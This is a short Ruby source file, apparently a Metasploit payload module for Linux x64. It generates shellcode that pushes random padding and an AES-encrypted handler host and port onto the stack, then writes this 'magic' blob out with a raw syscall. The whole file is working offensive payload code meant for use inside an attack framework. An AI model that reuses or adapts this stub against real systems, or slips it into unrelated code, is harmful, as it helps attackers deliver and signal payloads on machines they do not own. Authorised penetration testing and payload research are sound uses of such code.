# -*- coding: binary -*-

module Msf
  module Payload::Linux::SendMagicX64
    include Rex::Crypto

    def asm_send_magic(opts = {})
      iconn = opts[:ihost]
      iconn += ':'
      iconn += opts[:iport]
      iconn += ("\0"*(31-iconn.length))
      n = rand(1...5)
      r = Random.new.bytes(n*8)

      magic = r
      magic += Aes256.encrypt_aes256(opts[:iv], opts[:key], iconn)

      asm = %^
      send_magic:
        xor    rax, rax
        mov    al, 0x01^
      magic.reverse.bytes.each_slice(8) do |word|
        asm << %^
        mov rbx, 0x#{word.pack('C*').unpack('H*')[0]}
        push   rbx^
      end

      asm << %^
        mov    dl, 0x#{'%02x' % magic.length}
        xor    rdi, rdi
        mov    rsi, rsp
        syscall^
      
      magic.reverse.bytes.each_slice(8) do |word|
        asm << %^
        pop r14^
      end

      asm << %^
        xor    r14, r14
        ^
      asm
    end
  end
end
